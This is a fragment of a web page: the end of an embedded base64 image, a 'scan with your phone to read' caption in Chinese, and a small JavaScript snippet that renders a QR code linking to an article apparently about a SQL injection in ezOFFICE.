izDOg5E7p/D6hPjU3gQP30NqS1WeD+bb1K9sFYw5CC9vX/bB3Ifo5uyFuW6u0GxdV8k7QmZBsLJVMPLSZuU8SL5ziN57YdQhHO54fUL6U3sxP12I2xch2/TcEK7fEeJDsPvOEfXlHfUh87pfHOLBiOXNypkdIf2znr0GY67P2Wf31+b22ulC9uHr+uefwPanLBi3DOEQ9Ch9q3JIDkbUtx9GH8L1zxCez3tv0dmdQ2ZCsOfMQ3wI9pxchHmuzzNfeH1C6im8US0X4hZFyLYh2HV/TeoijHlzYs9B8jCiOfse4SoL48w+wz5Irvudm++6vPuQuRDsucovF2L4wt99AoeFQLYHQY9T29uXuqgH6YOgPoSbE2Gu6/d+uT6kH+5oRoR49nQ09110bp+j3tEc5HzA9d9l3d7s6/CTuudzm3IRsk25ORh1fbHnIHl1cyvsOUj/LA+j13vtgTGnfsfnriBz4DE6DZLzXHs8/JZl04WveQLbzyH7LdX16jjlVelDti0vb1/qMObUVwhjHka+v0e/Xs1Uh8zqfTDqEA7BVd653ZfrQ+bIRYgOXN9Dbm/2tX0PgfuW4Py6/zr626B/psP8Xqs+54pw71d7FiG9q/zqDJC+M/9sLmTOPnd9D9k/jTe43hbits+wn9k8ZNsQXOXUITn71Tvqi4/87skh95KLzoTRh3AI9pzcOR3P/J7f820he/G6ft0TOCwE8lbAiN89ImSec3yLILpchOjmYc4hOtzRHtGZ8o76HVc5yL26D9FhxJ57xA8LeRS+vJ9/At9eCORt8Ki+ZTDq+iuEeR6iO7fjfp7eXqtryIy6rjIHow4jN1c9VRBfHcLL25e+qCdf8dK/vZAactX/7wn82EL62+CR1SFvl1z/WYSxv+ZAtNUMGP3qqTJf11WQHIxYXpV5sbQquQjpl6+weq0fW8jq5pf++AkcFuKmOq7GnOUgb4m51Rx1SF5uH0SHoP4z6Ayx98B85ll+5ff5ncP8fpU7LKTEq173BLaFQLYGj3F1VBj7VrmuQ/q63vnqbYT0w/H/JrbP6BzS22fLIb59MPKu26cuF2Hsh3C447YQh1z42idwLeS1z/9w9/8BAAD//9X25NIAAAAGSURBVAMAbRc4vyoG46MAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-selectCommentField-tableId-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 